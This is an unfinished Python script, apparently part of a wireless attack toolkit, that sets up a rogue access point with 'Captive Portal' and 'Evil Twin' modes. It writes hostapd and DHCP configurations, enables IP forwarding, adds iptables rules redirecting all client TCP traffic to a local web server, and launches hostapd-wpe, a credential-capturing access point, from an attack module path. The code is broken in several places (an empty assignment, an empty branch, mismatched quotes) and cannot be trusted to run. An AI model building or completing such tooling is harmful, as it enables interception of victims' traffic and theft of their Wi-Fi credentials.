#!/usr/bin/python
import sqlite3
import pandas as dp
import pandas
import Queries
from Queries import *
from prettytable import PrettyTable
import subprocess 

def option(option, var):
		if option in ["bssid"]:
			bssid = var
		elif option in ["channel"]:
			channel = var
		elif option in ["encryption"]:
			encrpyion = var
		elif option in ["ssid"]:
			ssid = var
		elif option in ["description"]:
			description()


def description():
	print ("need to put something here")


def main():
	q = queries()
	q.db_connect('ant')
	mode = 




	if option in ["Capitve Portal"]:
		hostapd_addon = ("#wpa=2"
				"#sets wpa passphrase required by the clients to authenticate themselves on the network" 
				"wpa_passphrase=your_passphrase"
				"#sets wpa key management" 
				"wpa_key_mgmt=WPA-EAP"
				"#sets encryption used by WPA" 
				"wpa_pairwise=TKIP" 
				"#sets encryption used by WPA2" 
				"rsn_pairwise=CCMP" )
		
	elif option in ["Evil Twin"]:



	ifco = 'ifconfig wlan0 192.168.0.1\n'  

	dhcp = ("default-lease-time 300;"
		"max-lease-time 360;"  
		"ddns-update-style none;"  
		"authoritative;"
		"log-facility local7;"  
		"subnet 192.168.0.0 netmask 255.255.255.0 {"  
		"range 192.168.0.100 192.168.0.200;"  
		"option routers 192.168.0.1;"  
		"option domain-name-servers 192.168.17.2;"  
		"}"
	      )

	ipfwd = "echo "1" > /proc/sys/net/ipv4/ip_forward\n" 
	iptbl = ("iptables -t nat -F\n"
		"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n"
        "iptables -t nat -A PREROUTING -i wlan0 -p tcp -j DNAT --to-destination 192.168.17.128:80\n"
 			)

	hostapd =(
				"# Define interface"
				"interface="+interface""
				"bssid=48:5d:60:7c:bd:f1"
				"driver=nl80211"
				"# Select driver"  
				"ssid="+SSID+""
				"# Set access point name"  
				"hw_mode=g"
				"# Set access point harware mode to 802.11g"  
				"# Enable WPA2 only (1 for WPA, 2 for WPA2, 3 for WPA + WPA2)"  
				"# Set WIFI channel (can be easily changed)"  
				"channel="+channel+""
				""
				)

	try:
		subprocess.call('./module/attack/hostapd/hostapd-wpe /hostapd-wpe.conf')
	except KeyboardInterrupt:
		return

main()

#("#wpa=2"
#				"#sets wpa passphrase required by the clients to authenticate themselves on the network" 
#				"wpa_passphrase=your_passphrase"
#				"#sets wpa key management" 
#				"wpa_key_mgmt=WPA-EAP"
#				"#sets encryption used by WPA" 
#				"wpa_pairwise=TKIP" 
#				"#sets encryption used by WPA2" 
#				"rsn_pairwise=CCMP" )